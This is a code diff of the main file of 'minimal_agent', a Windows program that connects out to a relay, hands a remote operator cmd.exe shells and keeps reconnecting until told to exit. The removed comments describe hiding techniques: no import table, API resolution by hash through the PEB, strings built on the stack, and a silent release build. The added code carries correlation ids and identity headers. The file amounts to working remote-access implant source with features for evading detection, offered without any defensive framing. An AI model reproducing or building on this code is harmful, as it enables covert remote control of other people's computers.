@@ -1,213 +1,125 @@
-/* minimal_agent - a minimal agent for Windows (WinHTTP, 8+).
- *
- * A "minimal agent" in the relay protocol is anything that answers the
- * operator panel's Hello command with a 750-byte identity frame. Everything
- * else (file browsing, shells, screenshots) is optional and advertised - or
- * deliberately not advertised - via the capability mask.
- *
- * This agent implements the Shell category (mask bit 1): the panel opens a
- * terminal window whose commands run in a local cmd.exe, and their output
- * streams back. One side effect of advertising Shell without FileSystem:
- * the panel's file manager falls back to its PowerShell-over-shell backend,
- * so a basic file browser comes for free.
- *
- * Lifecycle:
- *   [1] connect: session -> connection -> HTTP GET -> 101 upgrade -> socket
- *   [2] serve:   wait for a panel command, dispatch it, send one reply
- *   [3] redial:  on a lost connection (transport error or a close frame),
- *               wait 1..32 s and dial again - an agent never gives up.
- *               Only the Exit command (or killing the process) ends it;
- *               live shells survive a redial.
- *
- * Build - the single flavor is DEPENDENCY-FREE: no CRT, no import
- * table, no -lwinhttp. Every OS call (WinHTTP included) is resolved at
- * runtime from the PEB; the process starts at our own entry (entry.c),
- * not the CRT startup. Strings live as hash constants (apihash.h) or are
- * built on the stack (stackstrings.h); nothing is static, so there is no
- * .bss. Two steps - compile, then link (PowerShell, from the repo root;
- * the full story lives in README.md):
- *
- *   gcc -O2 -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident \`
- *       -c entry.c main.c transport.c shell.c report.c system_facts.c \`
- *       winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c \`
- *       peb.c system.c djb2.c logger.c
- *   New-Item -ItemType Directory -Force obj | Out-Null
- *   Move-Item *.o obj
- *   gcc -O2 -s -fno-asynchronous-unwind-tables -fno-shrink-wrap \`
- *       -fno-ident -nostdlib -e entry -Wl,-T,link.text-first.ld \`
- *       -o minimal_agent.exe \`
- *       (Get-ChildItem obj\*.o | ForEach-Object FullName)
- *
- * The two -fno-* flags are a PAIR: dropping the unwind tables frees the
- * compiler to shrink-wrap prologues, and the code GROWS by 1 KB; the
- * companion flag forbids that. For a dev build that talks (a release
- * build is silent by design), add -DLOGGING_ENABLED to BOTH the compile
- * and the link step and give the exe a distinct name, e.g.
- * minimal_agent_dev.exe - the full command pair is in README "Run".
- *
- * (entry.c MUST be in the object list and -e entry names the real entry
- *  point - omitting either leaves the entry address pointing at the
- *  wrong symbol. Verify after linking:
- *  objdump -f minimal_agent.exe | findstr /C:"start address"  vs
- *  nm on an unstripped check copy - see README "gates".)
- *
- * Run:
- *   minimal_agent.exe <URL>      e.g. ... https://relay.example.com/agent
- *   minimal_agent.exe <URL> -v   verbose (dev builds): dump each command
- *
- * The URL comes only from the command line; nothing is hardcoded.
- *
- * ============================================================================
- * Module map (one header = one topic)
- * ============================================================================
- *   main.c           this file - agent_main: dial, dispatch, redial
- *   entry.c/.h       the real process entry (no CRT startup)
- *   protocol.h       opcodes, statuses, identity frame, capability mask
- *   wire.h           tiny little-endian writers (header-only)
- *   transport.h/.c   the WebSocket pipe: ws_send / ws_receive
- *   shell.h/.c       the cmd.exe pool: spawn / read / write / teardown
- *   report.h/.c      terminal diagnostics (gone unless LOGGING_ENABLED)
- *   system_facts.h/.c  machine UUID + hostname/user/OS facts
- *   winhttp_api.h/.c the WinHTTP table + its LdrLoadDll bootstrap
- *   kernel32/ntdll/advapi  one resolved function table per DLL
- *   peb.h/.c         TEB/PEB access, loader module-list walk
- *   system.h/.c      export resolve - by name and by hash
- *   apihash.h        precomputed djb2 constants for every name
- *   stackstrings.h   runtime strings, built on the stack
- *   djb2.h/.c        the hash both resolve paths share
- *   string/memory/logger   the hand-rolled CRT replacements
- */
-
-#include "winhttp_api.h"   /* runtime-resolved WinHTTP table (no <winhttp.h>) */
-
-#include "string.h"     /* strcmp (the -v flag) */
+#include "winhttp_api.h"
 #include "protocol.h"
 #include "wire.h"
 #include "transport.h"
 #include "shell.h"
 #include "report.h"
-#include "system_facts.h"
+#include "identity_headers.h"
 #include "types.h"
 #include "wintypes.h"
 #include "memory.h"
+#include "string.h"
 #include "logger.h"
 #include "kernel32.h"
-#include "entry.h"      /* agent_main: the -nostdlib entry contract */
-#include "stackstrings.h" /* runtime strings, built on the stack */
-#include "environment.h"  /* access to environment variables */
+#include "entry.h"
+#include "stackstrings.h"
 
-/* Commit tag baked into the identity frame. CI overrides it with
- * -DAGENT_COMMIT_HASH="<8-char git hash>"; local builds keep the study tag. */
-/* CI passes -DAGENT_COMMIT_HASH="<8 hex chars>" AND -DAGENT_COMMIT_HASH_DEFINED;
- * local builds fall back to a stack-built tag (a literal would sit in .rdata). */
-
-/* ==========================================================================
- * Command handlers (one reply per request, except Exit)
- * ======================================================================== */
-
-/* Everything that must outlive a single function call, gathered into
- * one struct owned by agent_main's frame (which never returns until
- * the agent exits) and passed down as a single pointer. No file-scope
- * state, no .bss - the frame IS the global. */
 typedef struct {
-    shell_slot *shells;     /* the pool array, owned by agent_main   */
-    int verbose;            /* -v: dump every command's raw bytes    */
-    const WINHTTP_API *winhttp;  /* session table, owned by run_session */
+    shell_slot *shells;
+    int verbose;
+    const WINHTTP_API *winhttp;
 } agent_ctx;
 
-/* OpenShell: find a free pool slot (the slot index IS the shell id). */
-static DWORD handle_open_shell(const agent_ctx *ctx, unsigned char *reply, DWORD *reply_len)
+static unsigned read_u32_le_at(const unsigned char *data, int off)
+{
+    return (unsigned)data[off]
+         | ((unsigned)data[off + 1] << 8)
+         | ((unsigned)data[off + 2] << 16)
+         | ((unsigned)data[off + 3] << 24);
+}
+
+static DWORD handle_open_shell(const agent_ctx *ctx, unsigned int corr_id,
+                               unsigned char *reply, DWORD *reply_len)
 {
     int id = shell_open(ctx->shells);
 
     if (id < 0) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("OpenShell failed - replied status 1\n");
         return STATUS_ERROR;
     }
 
-    /* Exactly 12 bytes: the panel reads the id only when the
-     * reply is at least this long, else it assumes id 0. */
     int pos = 0;
     write_u32_le(reply, &pos, STATUS_OK);
+    write_u32_le(reply, &pos, corr_id);
     write_u64_le(reply, &pos, (unsigned long long)id);
-    *reply_len = 12;
+    *reply_len = 16;
     LOG_INFO("Shell %d opened (cmd.exe spawned) - id prepared\n", id);
     return STATUS_OK;
 }
 
-/* WriteShell: [shellId:8][UTF-8 input + NUL]. The panel already appends
- * "\n" to commands - appending another newline would execute every
- * command twice. */
 static DWORD handle_write_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                    unsigned char *reply, DWORD *reply_len)
+                                unsigned int corr_id,
+                                unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
     int status = STATUS_ERROR;
     if (slot) {
-        /* Strip trailing NUL(s); "\x03" passes through as Ctrl+C. */
         DWORD end = msg->length;
-        while (end > 9 && msg->data[end - 1] == '\0')
+        while (end > 13 && msg->data[end - 1] == '\0')
             end--;
-        if (end > 9 && shell_write(slot, msg->data + 9, end - 9) == 0)
+        if (end > 13 && shell_write(slot, msg->data + 13, end - 13) == 0)
             status = STATUS_OK;
     }
 
-    reply[0] = (unsigned char)status;
-    reply[1] = 0;
-    reply[2] = 0;
-    reply[3] = 0;
-    *reply_len = 4;
+    int pos = 0;
+    write_u32_le(reply, &pos, (DWORD)status);
+    write_u32_le(reply, &pos, corr_id);
+    *reply_len = 8;
     LOG_INFO("Write to shell %llu - status %d\n", id, status);
     return (DWORD)status;
 }
 
-/* ReadShell: drain what the shell has buffered. An empty chunk is legal
- * (that is "idle"); a dead shell reports status 1. */
 static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                   unsigned char *reply, DWORD *reply_len)
+                               unsigned int corr_id,
+                               unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
     if (!slot) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("Read shell %llu - unknown id, status 1\n", id);
         return STATUS_ERROR;
     }
 
-    /* [status:4][chunk][NUL] reply, 64K+5 on the frame; the prologue's
-     * stack probe makes a frame this large legal. */
-    unsigned char chunk[4 + SHELL_READ_CHUNK + 1];
+    unsigned char chunk[8 + SHELL_READ_CHUNK + 1];
     DWORD got = 0;
-    int r = shell_read(slot, chunk + 4, SHELL_READ_CHUNK, &got);
+    int r = shell_read(slot, chunk + 8, SHELL_READ_CHUNK, &got);
 
     if (r == SHELL_READ_DEAD) {
-        unsigned char status_error[4] = {1, 0, 0, 0};
+        unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
+        write_u32_le_at(status_error, 4, corr_id);
         MemoryCopy(reply, status_error, sizeof(status_error));
         *reply_len = sizeof(status_error);
         LOG_ERROR("Shell %llu exited - status 1, slot freed\n", id);
         return STATUS_ERROR;
     }
 
-    /* [status:4][chunk][NUL] - the NUL terminator is part of the
-     * v4 contract and is written explicitly (the panel strips
-     * exactly one). An empty chunk = "idle". */
     int pos = 0;
     write_u32_le(chunk, &pos, STATUS_OK);
-    chunk[4 + got] = '\0';
-    MemoryCopy(reply, chunk, 4 + got + 1);
-    *reply_len = 4 + got + 1;
+    write_u32_le(chunk, &pos, corr_id);
+    chunk[8 + got] = '\0';
+    MemoryCopy(reply, chunk, 8 + got + 1);
+    *reply_len = 8 + got + 1;
     if (r == SHELL_READ_IDLE)
         LOG_INFO("Read shell %llu - idle\n", id);
     else
@@ -215,12 +127,12 @@ static DWORD handle_read_shell(const agent_ctx *ctx, const incoming_message *msg
     return STATUS_OK;
 }
 
-/* CloseShell: "close and forget" - unknown ids still get status 0. */
 static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *msg,
-                                    unsigned char *reply, DWORD *reply_len)
+                                unsigned int corr_id,
+                                unsigned char *reply, DWORD *reply_len)
 {
     unsigned long long id = 0;
-    for (int i = 8; i >= 1; i--)
+    for (int i = 12; i >= 5; i--)
         id = (id << 8) | msg->data[i];
 
     shell_slot *slot = shell_lookup(ctx->shells, id);
@@ -231,20 +143,13 @@ static DWORD handle_close_shell(const agent_ctx *ctx, const incoming_message *ms
         LOG_INFO("Close shell %llu - not open (still ok)\n", id);
     }
 
-    reply[0] = 0;
-    reply[1] = 0;
-    reply[2] = 0;
-    reply[3] = 0;
-    *reply_len = 4;
-    LOG_INFO("No error reply prepared for CloseShell %llu\n", id);
+    int pos = 0;
+    write_u32_le(reply, &pos, STATUS_OK);
+    write_u32_le(reply, &pos, corr_id);
+    *reply_len = 8;
     return STATUS_OK;
 }
 
-/* ==========================================================================
- * main
- * ======================================================================== */
-
-/* One full connect/serve/close session (defined below main). */
 static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived);
 
 INT32 agent_main(const WCHAR *url)
@@ -253,39 +158,21 @@ INT32 agent_main(const WCHAR *url)
     if (!KERNEL32_Ctor(&kernel)) {
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
-   
-    /* Process-lifetime storage, in declaration order of first use:
-     * the URL, the shell pool, the redial backoff steps and the context
-     * that bundles them for the call tree. agent_main does not return
-     * until the agent exits, so these frame locals live as long as any
-     * static would - without a byte of static storage. */
-    ///WCHAR url[2048];
+
     shell_slot shells[SHELL_POOL_SIZE];
-    /* Uninitialized on purpose: an array initializer like {1,2,4,8,16,32}
-     * counts as initialized DATA - the compiler pools it and copies it
-     * in (one SIMD load from a constant pool). Filling it through the
-     * volatile pointer below keeps every step an instruction. */
+
     int backoff_steps[6];
-    /* volatile pointer: plain scalar stores would be re-recognized as an
-     * array initializer and pooled; volatile keeps them stores. */
+
     volatile int *bs = backoff_steps;
     bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
     const int backoff_count = 6;
     int backoff_pos = 0;
     agent_ctx ctx;
 
-    MemoryZero(shells, sizeof(shells));   /* all slots start free */
+    MemoryZero(shells, sizeof(shells));
     ctx.shells  = shells;
-    ctx.winhttp = NULL;                   /* run_session fills it */
-    
+    ctx.winhttp = NULL;
 
-    /* ----- The agent loop: dial, serve, redial. A lost connection is a
-     * normal event (the relay drops agent sockets when the paired operator
-     * disconnects, deploys recycle the Durable Object, idle NATs time out);
-     * each loss is answered with a fresh dial after a capped backoff. Only
-     * Exit (RC_EXIT) or an unrecoverable local failure ends the process.
-     * Live shells survive a redial - only the panel's view of them is new
-     * ids after the panel re-opens. */
     int rc = RC_SESSION_LOST;
     while (rc == RC_SESSION_LOST) {
         int long_lived = 0;
@@ -293,7 +180,7 @@ INT32 agent_main(const WCHAR *url)
         if (rc == RC_SESSION_LOST) {
 
             int wait_s = backoff_steps[backoff_pos];
-        
+
             if (long_lived)
                 backoff_pos = 0;
             else if (backoff_pos + 1 < backoff_count)
@@ -306,15 +193,10 @@ INT32 agent_main(const WCHAR *url)
     return rc;
 }
 
-/* One full session: connect, serve until the connection dies or Exit
- * arrives, close cleanly. Returns RC_EXIT / RC_SESSION_LOST / RC_LOCAL_ERROR.
- * All handles are released on every path (no leaks across redials).
- * *long_lived is set when the session served at least one command - the
- * caller uses it to reset the redial backoff after a healthy session. */
 static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
 {
-    /* Resource state for correct cleanup via goto. */
-    int rc = RC_SESSION_LOST;     /* default: dial again          */
+
+    int rc = RC_SESSION_LOST;
     HINTERNET session = NULL, connection = NULL, request = NULL;
     HINTERNET socket = NULL;
     KERNEL32 kernel32;
@@ -322,31 +204,27 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
         LOG_ERROR("Failed to load kernel32.dll\n");
     }
 
-    /* The runtime-resolved WinHTTP table (winhttp_api.h) - the same
-     * per-call Ctor idiom as KERNEL32 above: stack-local, no statics.
-     * Fail fast: without the table nothing below can run. */
     WINHTTP_API winhttp;
     if (!WINHTTP_API_Ctor(&winhttp)) {
         LOG_ERROR("Failed to resolve the WinHTTP table\n");
         return RC_LOCAL_ERROR;
     }
-    ((agent_ctx *)ctx)->winhttp = &winhttp;   /* session-lifetime, this frame */
+    ((agent_ctx *)ctx)->winhttp = &winhttp;
 
-    *long_lived = 0;                    /* set on the first served reply */
+    *long_lived = 0;
 
-    /* ----- Stage 2: split the URL into components (WinHttpCrackUrl) ----- */
     URL_COMPONENTS uc;
     MemoryZero(&uc, sizeof(uc));
     uc.dwStructSize = sizeof(uc);
 
-    WCHAR host[256];   /* WinHttpCrackUrl output buffers */
+    WCHAR host[256];
     WCHAR path[2048];
     uc.lpszHostName    = host;  uc.dwHostNameLength = 256;
     uc.lpszUrlPath     = path;  uc.dwUrlPathLength  = 2048;
 
     if (!winhttp.WinHttpCrackUrl(url, 0, 0, &uc)) {
         LOG_ERROR("WinHttpCrackUrl (invalid URL?) failed: %lu\n", kernel32.GetLastError());
-        rc = RC_LOCAL_ERROR;          /* a bad URL will not heal itself */
+        rc = RC_LOCAL_ERROR;
         goto cleanup;
     }
     if (uc.nScheme != INTERNET_SCHEME_HTTP &&
@@ -362,51 +240,60 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     }
     BOOL https = (uc.nScheme == INTERNET_SCHEME_HTTPS);
 
-    /* ----- Stage 3: session -> connection -> upgrade request ----- */
+    WCHAR scheme[6];
+    if (https) {
+        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p';
+        scheme[4]=L's'; scheme[5]=0;
+    } else {
+        scheme[0]=L'h'; scheme[1]=L't'; scheme[2]=L't'; scheme[3]=L'p'; scheme[4]=0;
+    }
     LOG_INFO("Connecting to %ls://%ls%ls ... ",
-           https ? L"https" : L"http", uc.lpszHostName, uc.lpszUrlPath);
-    
+           scheme, uc.lpszHostName, uc.lpszUrlPath);
 
-    WCHAR ua_buf[18];                     /* "minimal_agent/1.0" + NUL */
+    WCHAR ua_buf[18];
     StrUserAgent(ua_buf);
-    session = winhttp.WinHttpOpen(ua_buf,
-                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    session = winhttp.WinHttpOpen(ua_buf, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!session) { LOG_ERROR("WinHttpOpen failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
     connection = winhttp.WinHttpConnect(session, uc.lpszHostName, uc.nPort, 0);
     if (!connection) { LOG_ERROR("WinHttpConnect failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
-    /* An ordinary HTTPS GET - the WebSocket headers are added by the
-     * UPGRADE option below, not by us. */
     DWORD request_flags = WINHTTP_FLAG_REFRESH;
-    if (https) request_flags |= WINHTTP_FLAG_SECURE;   /* TLS for https */
+    if (https) request_flags |= WINHTTP_FLAG_SECURE;
     WCHAR get_buf[4];
     StrGetMethodW(get_buf);
-    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL,
-                                 WINHTTP_NO_REFERER,
-                                 WINHTTP_DEFAULT_ACCEPT_TYPES, request_flags);
+    request = winhttp.WinHttpOpenRequest(connection, get_buf, uc.lpszUrlPath, NULL, NULL, NULL, request_flags);
     if (!request) { LOG_ERROR("WinHttpOpenRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup; }
 
-    /* This option takes no buffer: lpBuffer must be NULL and length 0. */
-    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET,
-                          NULL, 0)) {
+    if (!winhttp.WinHttpSetOption(request, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0)) {
         LOG_ERROR("winhttp.WinHttpSetOption(UPGRADE_TO_WEB_SOCKET) failed: %lu\n", kernel32.GetLastError());
         goto cleanup;
     }
 
-    if (!winhttp.WinHttpSendRequest(request, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
-                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+    CHAR headers_a[IDENTITY_HEADERS_SIZE];
+    USIZE headers_len = build_identity_headers(headers_a);
+    if (headers_len == 0) {
+        LOG_ERROR("identity header block does not fit\n");
+        rc = RC_LOCAL_ERROR;
+        goto cleanup;
+    }
+    WCHAR headers_w[IDENTITY_HEADERS_SIZE];
+    if (AnsiToWide(headers_a, headers_w, IDENTITY_HEADERS_SIZE) < 0) {
+        LOG_ERROR("identity header block conversion failed\n");
+        rc = RC_LOCAL_ERROR;
+        goto cleanup;
+    }
+    LOG_INFO("Identity: %lu header bytes on the upgrade request\n",
+           (unsigned long)headers_len);
+
+    if (!winhttp.WinHttpSendRequest(request, headers_w,(DWORD)headers_len, NULL, 0, 0, 0)) {
         LOG_ERROR("WinHttpSendRequest failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
-    /* Required step: receive the handshake response ("101 Switching
-     * Protocols") before completing the upgrade. */
     if (!winhttp.WinHttpReceiveResponse(request, NULL)) {
         LOG_ERROR("WinHttpReceiveResponse failed: %lu\n", kernel32.GetLastError()); goto cleanup;
     }
 
-    /* Finish the handshake; the request handle is spent and gets closed. */
     socket = winhttp.WinHttpWebSocketCompleteUpgrade(request, 0);
     if (!socket) {
         LOG_ERROR("WinHttpWebSocketCompleteUpgrade failed: %lu\n", kernel32.GetLastError());
@@ -416,24 +303,21 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
     request = NULL;
     LOG_INFO("Connected (HTTP 101 Switching Protocols)\n");
 
-    /* ----- Stage 4: serve commands. Every request gets exactly one reply
-     * - except Exit, which gets none and terminates the agent. ----- */
     LOG_INFO("[2] Agent mode: replying to commands (capability mask = Shell)...\n");
-    /* One incoming command, assembled here across fragments. Declared
-     * outside the loop: 64K of frame is paid once per session. */
+
     incoming_message msg;
     for (int index = 1; ; index++) {
-        *long_lived = 1;                /* a command arrived on this wire */
+        *long_lived = 1;
         BOOL closed = FALSE;
 
         DWORD err = ws_receive(&winhttp, socket, &msg, &closed);
         if (err != NO_ERROR) {
             LOG_ERROR("WinHttpWebSocketReceive failed: %lu\n", err);
-            goto cleanup;             /* rc stays SESSION_LOST -> redial */
+            goto cleanup;
         }
         if (closed) {
             LOG_ERROR("Server closed the connection - redialing.\n");
-            goto cleanup;             /* a close frame is also just a loss */
+            goto cleanup;
         }
 
 #ifdef LOGGING_ENABLED
@@ -443,10 +327,13 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
 
         unsigned char opcode = (msg.length > 0) ? msg.data[0] : 0xFF;
 
-        /* A message that overflowed the receive buffer is refused whole:
-         * executing its head would run half a command. */
+        unsigned int corr_id = (msg.length >= 5) ? read_u32_le_at(msg.data, 1) : 0;
+
         if (msg.truncated) {
-            unsigned char status_error[4] = {1, 0, 0, 0};
+            unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
+            write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
                 LOG_ERROR("Message over %d bytes - refused, status 1\n",
@@ -457,36 +344,35 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             goto cleanup;
         }
 
-        if (opcode == CMD_EXIT) {       /* Exit: no reply, terminate now */
+        if (opcode == CMD_EXIT) {
             LOG_ERROR("Exit requested - terminating.\n");
-            rc = RC_EXIT;               /* a valid command, not an error */
-            goto cleanup;               /* spec: terminate immediately  */
+            rc = RC_EXIT;
+            goto cleanup;
         }
 
-        unsigned char reply[4 + SHELL_READ_CHUNK + 1];
+        unsigned char reply[8 + SHELL_READ_CHUNK + 1];
         DWORD reply_len = 0;
-        // if (opcode == CMD_HELLO) {
-        //     err = handle_hello(ctx, reply, &reply_len);
-        //     if (err == NO_ERROR)
-        //         err = ws_send(ctx->winhttp, socket, reply, reply_len);
-         if (opcode == CMD_OPEN_SHELL) {
-            err = handle_open_shell(ctx, reply, &reply_len);
+        if (opcode == CMD_OPEN_SHELL) {
+            err = handle_open_shell(ctx, corr_id, reply, &reply_len);
             if (err == NO_ERROR || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 9) {
-            err = handle_write_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_WRITE_SHELL && msg.length >= 13) {
+            err = handle_write_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_READ_SHELL && msg.length >= 9) {
-            err = handle_read_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_READ_SHELL && msg.length >= 13) {
+            err = handle_read_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 9) {
-            err = handle_close_shell(ctx, &msg, reply, &reply_len);
+        } else if (opcode == CMD_CLOSE_SHELL && msg.length >= 13) {
+            err = handle_close_shell(ctx, &msg, corr_id, reply, &reply_len);
             if (err == STATUS_OK || err == STATUS_ERROR)
                 err = ws_send(ctx->winhttp, socket, reply, reply_len);
-        } else {                        /* not implemented: status = 1 */
-            unsigned char status_error[4] = {1, 0, 0, 0};
+        } else {
+            unsigned char status_error[8];
+        status_error[0]=1; status_error[1]=0; status_error[2]=0; status_error[3]=0;
+        status_error[4]=0; status_error[5]=0; status_error[6]=0; status_error[7]=0;
+            write_u32_le_at(status_error, 4, corr_id);
             err = ws_send(ctx->winhttp, socket, status_error, sizeof(status_error));
             if (err == NO_ERROR) {
                 LOG_INFO("Command 0x%02x not implemented - replied status 1\n",
@@ -497,9 +383,8 @@ static int run_session(const agent_ctx *ctx, const WCHAR *url, int *long_lived)
             LOG_ERROR("winhttp.WinHttpWebSocketSend(reply) failed: %lu\n", err);
             goto cleanup;
         }
-    
+
     }
-    /* Unreachable: the serve loop above only leaves via goto cleanup. */
 
 cleanup:
     if (socket)     winhttp.WinHttpCloseHandle(socket);
